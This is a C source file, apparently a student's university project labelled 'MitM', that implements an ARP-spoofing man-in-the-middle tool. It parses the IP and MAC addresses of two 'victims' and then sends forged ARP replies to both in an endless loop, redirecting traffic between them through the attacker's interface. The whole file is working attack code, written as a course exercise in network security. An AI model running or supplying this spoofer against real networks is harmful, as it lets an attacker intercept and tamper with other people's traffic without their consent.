//VUTBR - FIT - PDS project MitM
//Author: Jan Kubis / xkubis13
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>

#include <arpa/inet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <linux/if_ether.h> // ETH_P_ARP = 0x0806

#include "pds_addr.h"
#include "pds_pkt.h"

typedef struct {
	char* ifName;
	int interval_ms;
	char* protocol;
	ipv4_t vic1_ip;
	mac_t vic1_mac;
	ipv4_t vic2_ip;
	mac_t vic2_mac;
} clargs_t;

int parseArgs(int argc, char* argv[], clargs_t *clargs){
	
	if(argc!=15){return 1;}

	int tmp_ip[4];
	unsigned int tmp_mac[6];

	for(int i=1;i<argc;i++){
		if(strcmp(argv[i],"-i")==0){
			if(argv[i++]==NULL){return 1;} //move to arg value && check value missing
			clargs->ifName=argv[i];
		}
		else if(strcmp(argv[i],"-t")==0){
			if(argv[i++]==NULL){return 1;} //move to arg value && check value missing
			if(!isdigit(*argv[i])){;return 1;} //ms integer
			clargs->interval_ms=strtol(argv[i],NULL,10);
		}
		else if(strcmp(argv[i],"-p")==0){
			if(argv[i++]==NULL){return 1;} //move to arg value && check value missing
			if(strcmp(argv[i],"arp")!=0 && strcmp(argv[i],"ndp")!=0){printf("ee");return 1;} // arp || ndp only
			clargs->protocol=argv[i];
		}
		else if(strcmp(argv[i],"-victim1ip")==0){
			if(argv[i++]==NULL){return 1;} //move to arg value && check value missing
			//todo: check address
			sscanf(argv[i], "%d.%d.%d.%d", &tmp_ip[0], &tmp_ip[1], &tmp_ip[2], &tmp_ip[3]);
			for(int x=0;x<IP4_LEN;x++){	clargs->vic1_ip[x] = tmp_ip[x];	} //int[4] to uint8_t[4]
		}
		else if(strcmp(argv[i],"-victim1mac")==0){
			if(argv[i++]==NULL){return 1;} //move to arg value && check value missing
			//todo: check address
			sscanf(argv[i], "%02x%02x.%02x%02x.%02x%02x", &tmp_mac[0], &tmp_mac[1], &tmp_mac[2], &tmp_mac[3], &tmp_mac[4], &tmp_mac[5]);
			for(int x=0;x<MAC_LEN;x++){	clargs->vic1_mac[x] = tmp_mac[x];	} //int[4] to uint8_t[4]
		}
		else if(strcmp(argv[i],"-victim2ip")==0){
			if(argv[i++]==NULL){return 1;} //move to arg value && check value missing
			//todo: check address
			sscanf(argv[i], "%d.%d.%d.%d", &tmp_ip[0], &tmp_ip[1], &tmp_ip[2], &tmp_ip[3]);
			for(int x=0;x<IP4_LEN;x++){	clargs->vic2_ip[x] = tmp_ip[x];	} //int[4] to uint8_t[4]
		}
		else if(strcmp(argv[i],"-victim2mac")==0){
			if(argv[i++]==NULL){return 1;} //move to arg value && check value missing
			//todo: check address
			sscanf(argv[i], "%02x%02x.%02x%02x.%02x%02x", &tmp_mac[0], &tmp_mac[1], &tmp_mac[2], &tmp_mac[3], &tmp_mac[4], &tmp_mac[5]);
			for(int x=0;x<MAC_LEN;x++){	clargs->vic2_mac[x] = tmp_mac[x];	} //int[4] to uint8_t[4]
		}
		else{
			return 1;
		}
	}

	return 0;
}

void spoof(iface_t iface, clargs_t clargs){
	
	int bytes_written=0;

	while(true){
		uint8_t* pkt1 = arp_pkt_build(clargs.vic2_ip,clargs.vic1_ip,iface.mac,clargs.vic1_mac,ARP_OP_REPLY);
		uint8_t* pkt2 = arp_pkt_build(clargs.vic1_ip,clargs.vic2_ip,iface.mac,clargs.vic2_mac,ARP_OP_REPLY);
		
		arp_print((arphdr_t*)(pkt1+14));
		arp_print((arphdr_t*)(pkt2+14));

		bytes_written =pcap_inject(iface.handle, pkt1, PKT_ARP_LEN);
		bytes_written =pcap_inject(iface.handle, pkt2, PKT_ARP_LEN);
		printf("%d\n", bytes_written);
		usleep(clargs.interval_ms*1000);
	}

	return;
}

int main(int argc, char* argv[]){
	clargs_t clargs;
	iface_t iface;

	if((parseArgs(argc,argv,&clargs))!=0){
		printf("ARG_ERR\n");
		return 0;
	}

	char errbuf[PCAP_ERRBUF_SIZE];
	if ((iface.handle=pcap_create(clargs.ifName,errbuf))==NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", clargs.ifName, errbuf);
		return 0;
	}
	iface.name=clargs.ifName;
	getifmac(iface.name,iface.mac);
	getifipv4(iface.name,iface.ipv4);

	pcap_activate(iface.handle);

	spoof(iface,clargs);

	pcap_close(iface.handle);
}